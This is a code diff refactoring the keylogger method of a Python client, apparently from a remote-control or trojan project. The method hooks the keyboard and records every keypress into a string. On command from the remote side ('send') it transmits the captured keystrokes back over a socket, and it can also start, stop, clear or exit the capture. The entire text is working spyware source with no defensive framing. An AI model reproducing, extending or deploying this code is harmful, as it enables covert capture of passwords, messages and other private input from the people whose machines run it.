@@ -198,6 +198,10 @@ class Client:
 
     # keylogger func
     def keylogger_Server(self):
+        print(f'{self.addr} \tKEYLOGGER FUNCTION')
+        string = ''
+        listener = None
+        
         def on_press(key):
             nonlocal string
             try:
@@ -214,27 +218,22 @@ class Client:
                 else:
                     string += f'[{_key}]'
 
-        print('KEYLOGGER FUNCTION')
-        string = ''
-        isHook = False
-
         while True:
             flag = self.buff.recv_until(self.DELIM).decode()
-            print(f'\tReceive: {flag}')
+            print(f'{self.addr} \t\tReceive: {flag}')
             
-            if flag == 'hook' and not isHook:
+            if flag == 'hook' and listener == None:
                 listener = keyboard.Listener(on_press = on_press)
                 listener.start()
-                isHook = True
-            elif flag == 'unhook' and isHook:
+            elif flag == 'unhook' and listener != None:
                 listener.stop()
-                isHook = False
+                listener = None
             elif flag == 'clear':
                 string = ''
             elif flag == 'send':
                 self.buff.send(string.encode() + self.DELIM)
             elif flag == 'exit':
-                if isHook:
+                if listener != None:
                     listener.stop()
                 break
             
